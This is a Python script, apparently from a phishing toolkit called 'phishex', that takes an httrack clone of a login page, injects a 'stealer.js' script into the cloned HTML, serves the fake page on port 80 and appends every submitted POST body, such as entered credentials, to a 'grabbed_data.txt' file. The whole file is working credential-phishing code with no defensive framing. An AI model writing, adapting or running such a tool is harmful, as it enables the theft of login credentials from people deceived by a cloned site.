import http.server
import socketserver
import logging
import cgi
import os
import time
import os.path
from shutil import copyfile


# Write application local path to configuration file
getProjectPath = os.path.abspath('.')
configPath = '/opt/tomcat/apache-tomcat-9.0.33/bin/'
if not os.path.exists(configPath+'phishex.cfg'):
    f = open(configPath+'phishex.cfg', 'w+')
    f.write(getProjectPath)
    f.close


# Clearing httrack directory before mirroring
if os.path.isfile('httrack/index.html'):
    print('[INFO] Clearing httrack directory')
    os.system('rm -r httrack/*')


# Get mirrored site location
grabbedPath = ''
counter = 0
c = 0
while counter == 0:
    if not os.path.isfile('httrack/index.html'):
        c+=1
        print('\r[INFO] ({})Waiting for login page-clone...'.format(c), end='')
    if os.path.isfile('httrack/index.html'):
        with open('httrack/index.html') as f:
            for line in f:
                if '<A HREF' in line:
                    grabbedPath = 'httrack/'+line.split('"')[1]
                    counter = 1
    else:
        time.sleep(5)


# Change html file encoding to utf-8
print('[INFO] Check html encoding')
os.system('sudo file -bi {} > enc_type.txt'.format(grabbedPath))
f = open('enc_type.txt', 'r')
encType = f.read().split(' ')[1].split('=')[1]
f.close
if('unknown' in encType):
    encType = 'cp1252'
#    outFile = grabbedPath.split('/')[0]+'/tmp_out/'+grabbedPath.split('/')[1]
#    os.system('iconv -s -c -f {} -t utf-8 {} -o {}'.format(encType, grabbedPath, outFile))
os.system('sudo rm enc_type.txt')


# Inject code-stealer in html page
print('[INFO] Injecting script stealer into main html page')
lines = []
with open(grabbedPath, encoding=encType) as f:
    for line in f:
        if '</head>' in line:
            line = '''	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
</head>'''
        if '</body>' in line:
            line = '''	<script src="stealer.js"></script>
</body>'''
        lines.append(line)
open(grabbedPath, 'w').writelines(lines)



# Moving to the mirrored site location
servStartPath = ''
for i in range(len(grabbedPath.split('/'))-1):
    servStartPath += grabbedPath.split('/')[i] + '/'

web_dir = os.path.join(os.path.dirname(__file__), servStartPath)
os.chdir(web_dir)
copyfile(getProjectPath+'/stealer.js', getProjectPath+'/'+servStartPath+'stealer.js')


# Run local server
print('[INFO] Running server')
PORT = 80
class ServerHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        f = open(configPath+'grabbed_data.txt', 'a')
        f.write("GRABBED #{}/{}#{}\n\n".format(servStartPath.split('/')[1], grabbedPath.split('/')[-1], post_data.decode('utf-8')))
        f.close

        http.server.SimpleHTTPRequestHandler.do_GET(self)

Handler = ServerHandler

httpd = socketserver.TCPServer(("", PORT), Handler)

print("[OK]   Serving at port", PORT)
try:
    httpd.serve_forever()
except KeyboardInterrupt:
    httpd.server_close()


